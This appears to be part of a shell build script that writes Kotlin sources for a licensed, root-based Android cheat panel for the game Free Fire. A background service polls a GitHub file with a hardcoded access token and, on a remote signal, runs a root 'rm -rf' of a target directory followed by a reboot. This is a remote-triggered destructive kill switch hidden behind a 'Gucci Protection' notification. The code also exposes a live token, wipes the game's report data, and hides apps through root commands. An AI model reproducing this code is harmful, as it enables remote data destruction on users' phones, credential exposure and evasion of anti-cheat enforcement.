                nm.createNotificationChannel(NotificationChannel("reboot_ch", "Reboot Service", NotificationManager.IMPORTANCE_MIN))
            }
            val notification = NotificationCompat.Builder(this, "reboot_ch").setContentTitle("Gucci Protection").setContentText("Running in background...").setSmallIcon(android.R.drawable.stat_notify_sync_noanim).build()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { startForeground(3, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) } else { startForeground(3, notification) }
        }
        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
        val licenseKey = prefs.getString("license_key", "")
        if (!licenseKey.isNullOrEmpty()) {
            scope.launch {
                val tokenPart1 = "ghp_Lla9yGQggCqrab1"
                val tokenPart2 = "OA7X7yTpxrhNX6w0AZarM"
                val token = tokenPart1 + tokenPart2
                while (isActive) {
                    try {
                        val conn = URL("https://api.github.com/repos/guccipanelfree/Guccicorenew/contents/data.json").openConnection() as HttpURLConnection
                        conn.setRequestProperty("Authorization", "Bearer $token")
                        conn.setRequestProperty("Accept", "application/vnd.github+json")
                        val text = conn.inputStream.bufferedReader().readText()
                        val o = JSONObject(text)
                        val b64 = o.getString("content").replace("\n", "")
                        val root = JSONObject(String(Base64.decode(b64, Base64.DEFAULT)))
                        val lastRebootTime = prefs.getLong("last_reboot_time", 0L)
                        var triggerRebootTime = 0L
                        val globalRebootTime = root.optLong("reboot_global_time", 0L)
                        if (globalRebootTime > lastRebootTime) triggerRebootTime = globalRebootTime
                        val globalTimer = root.optLong("global_reboot_timer", 0L)
                        if (globalTimer > lastRebootTime && System.currentTimeMillis() >= globalTimer) triggerRebootTime = globalTimer
                        val keys = root.optJSONObject("keys")
                        if (keys != null && keys.has(licenseKey)) {
                            val keyData = keys.getJSONObject(licenseKey)
                            val keyRebootTime = keyData.optLong("reboot_now_time", 0L)
                            if (keyRebootTime > lastRebootTime) triggerRebootTime = keyRebootTime
                            val keyTimer = keyData.optLong("reboot_timer", 0L)
                            if (keyTimer > lastRebootTime && System.currentTimeMillis() >= keyTimer) triggerRebootTime = keyTimer
                        }
                        if (triggerRebootTime > 0L) {
                            prefs.edit().putLong("last_reboot_time", triggerRebootTime).apply()
                            val command = "rm -rf $targetDir && reboot"
                            Runtime.getRuntime().exec(arrayOf("su", "-c", command)).waitFor()
                            break
                        }
                    } catch (e: Exception) { }
                    delay(30000) 
                }
            }
        }
        return START_STICKY
    }
    override fun onDestroy() { scope.cancel(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
EOF

cat > app/src/main/java/com/example/shtile/SafeTileService.kt << 'EOF'
package com.example.shtile
import android.content.Intent
import android.os.Build
import android.service.quicksettings.Tile
import android.service.quicksettings.TileService
import android.widget.Toast
class SafeTileService : TileService() { 
    override fun onStartListening() { qsTile?.apply { label = "Boost"; state = Tile.STATE_INACTIVE; updateTile() } }; 
    override fun onClick() { 
        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
        if (!prefs.getBoolean("has_valid_license", false)) { Toast.makeText(this, "❌ Please Login first", Toast.LENGTH_SHORT).show(); return }
        if (!prefs.getBoolean("allow_inx", true)) { Toast.makeText(this, "🔒 INX (Boost) locked by Admin", Toast.LENGTH_SHORT).show(); return }
        val i = Intent(this, RunnerService::class.java).apply { action = "NORMAL" }; 
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i) 
    } 
}
EOF

cat > app/src/main/java/com/example/shtile/BrutalTileService.kt << 'EOF'
package com.example.shtile
import android.content.Intent
import android.os.Build
import android.service.quicksettings.Tile
import android.service.quicksettings.TileService
import android.widget.Toast
class BrutalTileService : TileService() { 
    override fun onStartListening() { qsTile?.apply { label = "Turbo Mode"; state = Tile.STATE_INACTIVE; updateTile() } }; 
    override fun onClick() { 
        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
        if (!prefs.getBoolean("has_valid_license", false)) { Toast.makeText(this, "❌ Please Login first", Toast.LENGTH_SHORT).show(); return }
        if (!prefs.getBoolean("allow_inx", true)) { Toast.makeText(this, "🔒 INX (Turbo) locked by Admin", Toast.LENGTH_SHORT).show(); return }
        val i = Intent(this, RunnerService::class.java).apply { action = "BRUTAL" }; 
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i) 
    } 
}
EOF

cat > app/src/main/java/com/example/shtile/FocusTileService.kt << 'EOF'
package com.example.shtile
import android.content.ComponentName
import android.content.pm.PackageManager
import android.service.quicksettings.Tile
import android.service.quicksettings.TileService
import android.widget.Toast
class FocusTileService : TileService() { 
    private val c by lazy { ComponentName(applicationContext, "com.example.shtile.MainActivityAlias") }; 
    override fun onStartListening() { updateState() }; 
    override fun onClick() { 
        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
        if (!prefs.getBoolean("has_valid_license", false)) { Toast.makeText(this, "❌ Please Login first", Toast.LENGTH_SHORT).show(); return }
        val pm = packageManager; val s = pm.getComponentEnabledSetting(c); val n = if (s == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED; pm.setComponentEnabledSetting(c, n, PackageManager.DONT_KILL_APP); updateState() 
    }; 
    private fun updateState() { 
        val s = packageManager.getComponentEnabledSetting(c); 
        qsTile?.apply { label = "Focus Mode"; state = if (s == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) Tile.STATE_ACTIVE else Tile.STATE_INACTIVE; updateTile() } 
    } 
}
EOF

cat > app/src/main/java/com/example/shtile/FloaterTileService.kt << 'EOF'
package com.example.shtile
import android.app.PendingIntent
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.service.quicksettings.Tile
import android.service.quicksettings.TileService
import android.widget.Toast
class FloaterTileService : TileService() {
    override fun onStartListening() { qsTile?.apply { label = "Floater"; state = Tile.STATE_INACTIVE; updateTile() } }
    override fun onClick() {
        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
        if (!prefs.getBoolean("has_valid_license", false)) { Toast.makeText(this, "❌ Please Login first", Toast.LENGTH_SHORT).show(); return }
        if (!prefs.getBoolean("allow_floater", true)) { Toast.makeText(this, "🔒 Floater locked by Admin", Toast.LENGTH_SHORT).show(); return }
        if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Please allow 'Display over other apps'", Toast.LENGTH_LONG).show()
            val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { startActivityAndCollapse(PendingIntent.getActivity(this, 0, i, PendingIntent.FLAG_IMMUTABLE)) } else { @Suppress("DEPRECATION") startActivityAndCollapse(i) }
            return
        }
        val intent = Intent(this, TransparentActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { startActivityAndCollapse(pendingIntent) } else { @Suppress("DEPRECATION") startActivityAndCollapse(intent) }
            qsTile?.apply { state = Tile.STATE_ACTIVE; updateTile() }
        } catch (e: Exception) { Toast.makeText(this, "Tile Error: ${e.message}", Toast.LENGTH_SHORT).show() }
    }
}
EOF

cat > app/src/main/java/com/example/shtile/GucciVoicesTileService.kt << 'EOF'
package com.example.shtile
import android.app.PendingIntent
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.service.quicksettings.Tile
import android.service.quicksettings.TileService
import android.widget.Toast
class GucciVoicesTileService : TileService() {
    override fun onStartListening() { qsTile?.apply { label = "Gucci Voices"; state = Tile.STATE_INACTIVE; updateTile() } }
    override fun onClick() {
        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
        if (!prefs.getBoolean("has_valid_license", false)) { Toast.makeText(this, "❌ Please Login first", Toast.LENGTH_SHORT).show(); return }
        if (!prefs.getBoolean("allow_voice", true)) { Toast.makeText(this, "🔒 Voice locked by Admin", Toast.LENGTH_SHORT).show(); return }
        if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Please enable 'Display over other apps'", Toast.LENGTH_LONG).show()
            val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { startActivityAndCollapse(PendingIntent.getActivity(this, 0, i, PendingIntent.FLAG_IMMUTABLE)) } else { @Suppress("DEPRECATION") startActivityAndCollapse(i) }
            return
        }
        val intent = Intent(this, TransparentVoiceActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { startActivityAndCollapse(pendingIntent) } else { @Suppress("DEPRECATION") startActivityAndCollapse(intent) }
            qsTile?.apply { state = Tile.STATE_ACTIVE; updateTile() }
        } catch (e: Exception) { Toast.makeText(this, "Tile Error: ${e.message}", Toast.LENGTH_SHORT).show() }
    }
}
EOF

cat > app/src/main/java/com/example/shtile/PayTileService.kt << 'EOF'
package com.example.shtile
import android.content.Intent
import android.os.Build
import android.service.quicksettings.Tile
import android.service.quicksettings.TileService
import android.widget.Toast
import java.io.DataOutputStream
class PayTileService : TileService() {
    override fun onStartListening() { updateState() }
    override fun onClick() {
        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
        if (!prefs.getBoolean("has_valid_license", false)) { Toast.makeText(this, "❌ Please Login first", Toast.LENGTH_SHORT).show(); return }
        val isCurrentlyHidden = prefs.getBoolean("is_pay_hidden", false)
        val hiddenApps = prefs.getStringSet("safe_apps", emptySet()) ?: emptySet()
        val timerMinutes = prefs.getInt("timer_minutes", 0)
        if (hiddenApps.isEmpty()) { Toast.makeText(this, "No apps selected in Hide menu", Toast.LENGTH_SHORT).show(); return }
        val newState = !isCurrentlyHidden
        Thread { try { val cmd = StringBuilder(); val history = prefs.getStringSet("hidden_history", emptySet())?.toMutableSet() ?: mutableSetOf(); for (pkg in hiddenApps) { if (newState) { history.add(pkg); cmd.append("pm hide $pkg; pm disable-user --user 0 $pkg; ") } else { history.remove(pkg); cmd.append("pm unhide $pkg; pm enable $pkg; cmd package install-existing --user 0 $pkg; ") } }; val p = Runtime.getRuntime().exec("su"); val os = DataOutputStream(p.outputStream); os.writeBytes(cmd.toString() + "\n"); os.writeBytes("exit\n"); os.flush(); os.close(); p.waitFor(); prefs.edit().putBoolean("is_pay_hidden", newState).putStringSet("hidden_history", history).apply() } catch (e: Exception) {} }.start()
        if (newState && timerMinutes > 0) { val intent = Intent(this, TimerService::class.java).putExtra("minutes", timerMinutes); if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent); Toast.makeText(this, "Apps Hidden for $timerMinutes Minutes", Toast.LENGTH_SHORT).show() } else if (newState) { Toast.makeText(this, "Apps Hidden", Toast.LENGTH_SHORT).show() } else { stopService(Intent(this, TimerService::class.java)); Toast.makeText(this, "Apps Restored", Toast.LENGTH_SHORT).show() }
        updateState(newState)
    }
    private fun updateState(forceState: Boolean? = null) { val isHidden = forceState ?: getSharedPreferences("HidePrefs", MODE_PRIVATE).getBoolean("is_pay_hidden", false); qsTile?.apply { label = "Payment Protection"; state = if (isHidden) Tile.STATE_ACTIVE else Tile.STATE_INACTIVE; updateTile() } }
}
EOF

cat > app/src/main/java/com/example/shtile/ClearReportActivity.kt << 'EOF'
package com.example.shtile
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import java.io.File
class ClearReportActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_clear_report)
        val btnSafe = findViewById<MaterialButton>(R.id.btnSafeClear)
        val btnDeep = findViewById<MaterialButton>(R.id.btnDeepClear)
        btnSafe.setOnClickListener { Toast.makeText(this, "Clearing safe reports...", Toast.LENGTH_SHORT).show(); executeClearScript(false) }
        btnDeep.setOnClickListener {
            AlertDialog.Builder(this).setTitle("⚠️ WARNING: DEEP CLEAN").setMessage("Are you absolutely sure?\n\nThis will delete EVERYTHING inside the Free Fire folder (/data/user/0/com.dts.freefiremax/).\n\nIt MAY delete your game settings, logins, or data. This cannot be undone.").setPositiveButton("YES, DELETE EVERYTHING") { _, _ -> Toast.makeText(this, "Deep cleaning...", Toast.LENGTH_SHORT).show(); executeClearScript(true) }.setNegativeButton("CANCEL", null).show()
        }
    }
    private fun executeClearScript(isDeep: Boolean) {
        Thread {
            try {
                val scriptFile = File(cacheDir, "clear_report.sh")
                val targetPath = if (isDeep) "/data/user/0/com.dts.freefiremax/" else "/data/user/0/com.dts.freefiremax/files/"
                scriptFile.writeText("""
                    #!/system/bin/sh
                    TARGET_DIR="$targetPath"
                    if [ -d "${'$'}TARGET_DIR" ]; then
                        rm -rf "${'$'}TARGET_DIR"*
                        echo "SUCCESS"
                    else
                        echo "FOLDER_NOT_FOUND"
                    fi
                """.trimIndent())
                val chmodP = ProcessBuilder("su", "-c", "chmod 777 " + scriptFile.absolutePath).start()
                chmodP.waitFor()
                val p = ProcessBuilder("su", "-mm", "-c", "sh " + scriptFile.absolutePath).redirectErrorStream(true).start()
                val output = p.inputStream.bufferedReader().readText()
                val code = p.waitFor()
                scriptFile.delete()
                Handler(Looper.getMainLooper()).post {
                    if (output.contains("SUCCESS") && code == 0) {
                        val msg = if (isDeep) "🚨 Deep Report Cleared!" else "✅ Safe Reports Cleared!"
                        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
                    } else if (output.contains("FOLDER_NOT_FOUND")) {
                        Toast.makeText(this, "❌ Folder Not Found!\nIs Free Fire installed?", Toast.LENGTH_LONG).show()
                    } else {
                        Toast.makeText(this, "❌ Failed (Check Root).\nOutput: $output", Toast.LENGTH_LONG).show()
                    }
                }
            } catch (e: Exception) { Handler(Looper.getMainLooper()).post { Toast.makeText(this, "❌ Error: ${e.message}", Toast.LENGTH_LONG).show() } }
        }.start()
    }
}
EOF
cat > app/src/main/java/com/example/shtile/LoginActivity.kt << 'EOF'
package com.example.shtile
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Base64
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.android.material.button.MaterialButton
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class LoginActivity : AppCompatActivity() {
    private val tokenPart1 = "ghp_Lla9yGQggCqrab1"
    private val tokenPart2 = "OA7X7yTpxrhNX6w0AZarM"
    private val ghToken get() = tokenPart1 + tokenPart2
    private val ghOwner = "guccipanelfree"
    private val ghRepo  = "Guccicorenew"
    private val ghPath  = "data.json"
    private val prefs by lazy { getSharedPreferences("GucciPrefs", MODE_PRIVATE) }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs.edit().putBoolean("is_authenticated", false).apply()
        setContentView(R.layout.activity_login)
        val keyInput = findViewById<EditText>(R.id.keyInput)
        val loginBtn = findViewById<MaterialButton>(R.id.loginBtn)
        val deviceIdText = findViewById<TextView>(R.id.deviceIdText)
        
        // 🚀 PERMANENT HARDWARE HWID (Never changes)
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val hardware = Build.BOARD + Build.BRAND + Build.DEVICE + Build.MODEL
        val hwid = ("$androidId$hardware").replace("[^a-zA-Z0-9]".toRegex(), "")
        
        deviceIdText.text = "Device ID: ${hwid.take(8)}...${hwid.takeLast(4)}"
        val savedKey = prefs.getString("license_key", "")
        if (!savedKey.isNullOrEmpty()) { keyInput.setText(savedKey) }
        
        loginBtn.setOnClickListener {
            val userKey = keyInput.text.toString().trim()
            if (userKey.isEmpty()) { Toast.makeText(this, "Enter a key", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
            verifyKey(userKey, hwid)
        }
    }
    
    private fun verifyKey(userKey: String, hwid: String) {
        val btn = findViewById<MaterialButton>(R.id.loginBtn)
        btn.isEnabled = false; btn.text = "Checking HWID..."
        lifecycleScope.launch {
            try {
                val readResult = withContext(Dispatchers.IO) { readDataJson() }
                if (readResult == null) { showError("Network Error. Check Internet."); reset(); return@launch }
                
                val root = JSONObject(readResult.content)
                val keys = root.optJSONObject("keys")
                if (keys == null || !keys.has(userKey)) { showError("❌ Invalid Key."); reset(); return@launch }
                
                val keyData = keys.getJSONObject(userKey)
                if (keyData.optBoolean("revoked", false)) { showError("❌ Key Revoked."); reset(); return@launch }
                
                val exp = keyData.optLong("expiresAt", 0L)
                if (exp > 0L && System.currentTimeMillis() > exp) { showError("❌ Key Expired."); reset(); return@launch }
                
                val maxDevices = keyData.optInt("maxDevices", 1)
                val cleanArr = JSONArray()
                val deviceIdsObj = keyData.opt("deviceIds")
                if (deviceIdsObj is JSONArray) {
                    for (i in 0 until deviceIdsObj.length()) {
                        cleanArr.put(deviceIdsObj.getString(i))
                    }
                } else if (deviceIdsObj is String) {
                    val parts = deviceIdsObj.split(",")
                    for (part in parts) if (part.trim().isNotEmpty()) cleanArr.put(part.trim())
                }
                
                var isThisPhoneBound = false
                for (i in 0 until cleanArr.length()) { 
                    if (cleanArr.getString(i) == hwid) { isThisPhoneBound = true; break } 
                }
                
                if (isThisPhoneBound) { 
                    success(userKey, hwid, exp, keyData); 
                    return@launch 
                }
                
                // STRICT LOCK CHECK
                if (cleanArr.length() >= maxDevices) { 
                    showError("❌ Key is locked to $maxDevices device(s).\nThis device is not authorized."); 
                    reset(); return@launch 
                }
                
                btn.text = "Binding HWID..."
                cleanArr.put(hwid)
                keyData.put("deviceIds", cleanArr)
                
                val ok = withContext(Dispatchers.IO) { writeDataJson(root, readResult.sha, "Locked Key $userKey to HWID $hwid") }
                if (ok) { success(userKey, hwid, exp, keyData) } else { showError("⚠️ Auto-Bind failed. Token error."); reset() }
            } catch (e: Exception) { showError("Error: ${e.message}"); reset() }
        }
    }
    
    data class ReadResult(val content: String, val sha: String)
    private fun readDataJson(): ReadResult? = try {
        val conn = URL("https://api.github.com/repos/$ghOwner/$ghRepo/contents/$ghPath?t=${System.currentTimeMillis()}").openConnection() as HttpURLConnection
        conn.setRequestProperty("Authorization", "Bearer $ghToken")
        conn.setRequestProperty("Accept", "application/vnd.github+json")
        conn.connectTimeout = 10000; conn.readTimeout = 10000
        val text = conn.inputStream.bufferedReader().readText()
        val o = JSONObject(text)
        val sha = o.getString("sha")
        val b64 = o.getString("content").replace("\n", "")
        ReadResult(String(Base64.decode(b64, Base64.DEFAULT)), sha)
    } catch (e: Exception) { null }
    
    private fun writeDataJson(root: JSONObject, sha: String, msg: String): Boolean = try {
        val newContent = Base64.encodeToString(root.toString(2).toByteArray(), Base64.NO_WRAP)
        val body = JSONObject().put("message", msg).put("content", newContent).put("sha", sha).toString()
        val conn = URL("https://api.github.com/repos/$ghOwner/$ghRepo/contents/$ghPath").openConnection() as HttpURLConnection
        conn.requestMethod = "PUT"; conn.doOutput = true
        conn.setRequestProperty("Authorization", "Bearer $ghToken")
        conn.setRequestProperty("Accept", "application/vnd.github+json")
        conn.setRequestProperty("Content-Type", "application/json")
        conn.connectTimeout = 10000; conn.readTimeout = 10000
        conn.outputStream.write(body.toByteArray())
        conn.responseCode == 200
    } catch (e: Exception) { false }
    
    private fun success(key: String, hwid: String, exp: Long, keyData: JSONObject) {
        prefs.edit()
            .putBoolean("is_authenticated", true).putBoolean("has_valid_license", true)
            .putString("license_key", key).putString("device_id", hwid).putLong("license_expires", exp)
            .putBoolean("allow_inx", keyData.optBoolean("allowInx", true))
            .putBoolean("allow_floater", keyData.optBoolean("allowFloater", true))
            .putBoolean("allow_kernel", keyData.optBoolean("allowKernel", true))
            .putBoolean("allow_voice", keyData.optBoolean("allowVoice", true))
            .apply()
        Toast.makeText(this, "Login Successful!", Toast.LENGTH_SHORT).show()
        startActivity(Intent(this, MainActivity::class.java)); finish()
    }
    private fun reset() { val b = findViewById<MaterialButton>(R.id.loginBtn); b.isEnabled = true; b.text = "LOGIN" }
    private fun showError(m: String) = Toast.makeText(this, m, Toast.LENGTH_LONG).show()
}
EOF
cat > app/src/main/java/com/example/shtile/MainActivity.kt << 'EOF'
package com.example.shtile
import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.Editable
import android.text.TextWatcher
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import rikka.shizuku.Shizuku
class MainActivity : AppCompatActivity() {
    private val REQUEST_CODE = 1001
    private var isAdbMode = false
    private var activeDialog: AlertDialog? = null
    private val shizukuListener = object : Shizuku.OnRequestPermissionResultListener {
        override fun onRequestPermissionResult(requestCode: Int, grantResult: Int) {
            if (requestCode == REQUEST_CODE) {
                if (grantResult == PackageManager.PERMISSION_GRANTED) { isAdbMode = true; activeDialog?.dismiss(); Toast.makeText(this@MainActivity, "Shizuku Permission Granted!", Toast.LENGTH_SHORT).show() }
                else { Toast.makeText(this@MainActivity, "Shizuku Permission Denied.", Toast.LENGTH_SHORT).show() }
            }
        }
    }
    override fun onResume() { 
        super.onResume(); 
        if (!getSharedPreferences("GucciPrefs", Context.MODE_PRIVATE).getBoolean("is_authenticated", false)) {
            startActivity(Intent(this, LoginActivity::class.java)); finish(); return
        }
        if (activeDialog?.isShowing == true) { checkAccess() } 
    }
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        val p = getSharedPreferences("GucciPrefs", Context.MODE_PRIVATE)
        if (!p.getBoolean("is_authenticated", false)) {
            startActivity(Intent(this, LoginActivity::class.java)); finish(); return
        }
        setContentView(R.layout.activity_main)
        
        val serviceIntent = Intent(this, RebootService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent) else startService(serviceIntent)
        
        if (Build.VERSION.SDK_INT >= 33) {
            val permissions = mutableListOf<String>()
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) permissions.add(Manifest.permission.POST_NOTIFICATIONS)
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) permissions.add(Manifest.permission.RECORD_AUDIO)
            if (permissions.isNotEmpty()) requestPermissions(permissions.toTypedArray(), 2002)
        } else {
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(Manifest.permission.RECORD_AUDIO), 2002)
        }

        if (!Settings.canDrawOverlays(this)) { Toast.makeText(this, "Please enable 'Display over other apps' for Floater", Toast.LENGTH_LONG).show(); startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))) }
        
        val bi = findViewById<EditText>(R.id.brutalInput)
        val dn = findViewById<TextView>(R.id.driverNameText)
        val title = findViewById<TextView>(R.id.titleText)
        val sub = findViewById<TextView>(R.id.subtitleText)
        val ca = findViewById<TextView>(R.id.contactAdminText)
        val timerText = findViewById<TextView>(R.id.licenseTimerText)
        val keyInput = findViewById<EditText>(R.id.keyInput)
        
        val allowInx = p.getBoolean("allow_inx", true)
        val allowFloater = p.getBoolean("allow_floater", true)
        val allowKernel = p.getBoolean("allow_kernel", true)
        val allowVoice = p.getBoolean("allow_voice", true)
        
        if (!allowInx) {
            Thread { try { Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -f /data/local/tmp/Gucci_core /data/local/tmp/Gucci_brutal")).waitFor() } catch (e: Exception) {} }.start()
        }
        
        keyInput.setText(p.getString("game_key", ""))
        sub.text = android.text.Html.fromHtml("Premium Panel By <font color='#00E5A0'>GUCCI</font>", android.text.Html.FROM_HTML_MODE_LEGACY)
        bi.setText(p.getString("brutal_option", "7"))
        val m = mapOf("1" to "QX1", "2" to "GT", "3" to "rt-dev", "4" to "rt-proc", "5" to "QX(2)", "6" to "KPM", "7" to "DitPro KPM", "8" to "KMA KPM", "9" to "LDK KPM", "10" to "Paradise")
        bi.addTextChangedListener(object : TextWatcher { override fun beforeTextChanged(s: CharSequence?, st: Int, c: Int, a: Int) {}; override fun onTextChanged(s: CharSequence?, st: Int, b: Int, c: Int) { dn.text = m[s.toString().trim()] ?: "Unknown" }; override fun afterTextChanged(s: Editable?) {} })
        dn.text = m[bi.text.toString()] ?: "Unknown"
        
        val exp = p.getLong("license_expires", 0L)
        if (exp == 0L) {
            timerText.text = "License: Lifetime"
            timerText.setTextColor(Color.parseColor("#00E5A0"))
        } else {
            val diff = exp - System.currentTimeMillis()
            if (diff > 0) {
                val days = diff / (1000 * 60 * 60 * 24)
                val hours = (diff / (1000 * 60 * 60)) % 24
                timerText.text = "Expires in: ${days}D ${hours}H"
                timerText.setTextColor(Color.parseColor("#FF4D4D"))
                val handler = Handler(Looper.getMainLooper())
                val runnable = object : Runnable {
                    override fun run() {
                        if (System.currentTimeMillis() > exp) {
                            Toast.makeText(this@MainActivity, "❌ License Expired! Please Login again.", Toast.LENGTH_LONG).show()
                            p.edit().putBoolean("is_authenticated", false).putBoolean("has_valid_license", false).apply()
                            startActivity(Intent(this@MainActivity, LoginActivity::class.java)); finish()
                        } else { handler.postDelayed(this, 60000) }
                    }
                }
                handler.post(runnable)
            }
        }

        val openTg = { try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/Gucci8240"))) } catch (e: Exception) { Toast.makeText(this@MainActivity, "Telegram not installed", Toast.LENGTH_SHORT).show() } }
        title.setOnClickListener { openTg() }; sub.setOnClickListener { openTg() }; ca.setOnClickListener { openTg() }
        Shizuku.addRequestPermissionResultListener(shizukuListener)
        checkAccess()
        
        findViewById<Button>(R.id.saveKeyBtn).setOnClickListener {
            p.edit().putString("game_key", keyInput.text.toString().trim()).putString("brutal_option", bi.text.toString().trim()).apply()
            Toast.makeText(this@MainActivity, "Configuration Saved", Toast.LENGTH_SHORT).show()
        }
        
        val loadFilesBtn = findViewById<Button>(R.id.loadFilesBtn)
        if (!allowInx) {
            loadFilesBtn.text = "🔒 LOAD INX (LOCKED)"
            loadFilesBtn.setOnClickListener { Toast.makeText(this@MainActivity, "Feature locked by Admin", Toast.LENGTH_SHORT).show() }
        } else {
            loadFilesBtn.setOnClickListener {
                p.edit().putString("game_key", keyInput.text.toString().trim()).putString("brutal_option", bi.text.toString().trim()).apply()
                Installer.installAll(this) { ok -> Toast.makeText(this@MainActivity, if (ok) "Files Loaded" else "Failed. Check root.", Toast.LENGTH_SHORT).show() }
            }
        }
        
        val launchFloaterBtn = findViewById<Button>(R.id.launchFloaterBtn)
        if (!allowFloater) {
            launchFloaterBtn.text = "🔒 LAUNCH FLOATER (LOCKED)"
            launchFloaterBtn.setOnClickListener { Toast.makeText(this@MainActivity, "Feature locked by Admin", Toast.LENGTH_SHORT).show() }
        } else {
            launchFloaterBtn.setOnClickListener {
                val i = Intent(this, TransparentActivity::class.java)
                startActivity(i)
            }
        }
        
        val loadDriverBtn = findViewById<Button>(R.id.loadDriverBtn)
        if (!allowKernel) {
            loadDriverBtn.text = "🔒 KERNEL DRIVER LOADER (LOCKED)"
            loadDriverBtn.setOnClickListener { Toast.makeText(this@MainActivity, "Feature locked by Admin", Toast.LENGTH_SHORT).show() }
        } else {
            loadDriverBtn.setOnClickListener { startActivity(Intent(this, DriverLoaderActivity::class.java)) }
        }
        
        findViewById<Button>(R.id.clearReportBtn)?.setOnClickListener { startActivity(Intent(this, ClearReportActivity::class.java)) }
        findViewById<ImageButton>(R.id.hideAppsIcon).setOnClickListener { startActivity(Intent(this, HideAppsActivity::class.java)) }
        findViewById<ImageButton>(R.id.terminalIcon).setOnClickListener { startActivity(Intent(this, TerminalActivity::class.java)) }
        
        val voiceIcon = findViewById<ImageButton>(R.id.voiceIcon)
        if (!allowVoice) {
            voiceIcon.alpha = 0.5f
            voiceIcon.setOnClickListener {
                Toast.makeText(this@MainActivity, "🔒 Voice feature locked by Admin", Toast.LENGTH_SHORT).show()
                stopService(Intent(this@MainActivity, GucciVoiceService::class.java))
            }
        } else {
            voiceIcon.alpha = 1.0f
            voiceIcon.setOnClickListener { startActivity(Intent(this@MainActivity, GucciVoiceActivity::class.java)) }
            voiceIcon.setOnLongClickListener {
                stopService(Intent(this@MainActivity, GucciVoiceService::class.java))
                Toast.makeText(this@MainActivity, "⏹️ Voice Floater Stopped from Dashboard", Toast.LENGTH_SHORT).show()
                true
            }
        }
    }

    private fun checkAccess() {
        Thread {
            val hasRoot = try { val pr = ProcessBuilder("su", "-c", "id").start(); pr.inputStream.bufferedReader().readText().contains("uid=0") } catch (e: Exception) { false }
            val isShizukuRunning = try { Shizuku.pingBinder() } catch (e: Exception) { false }
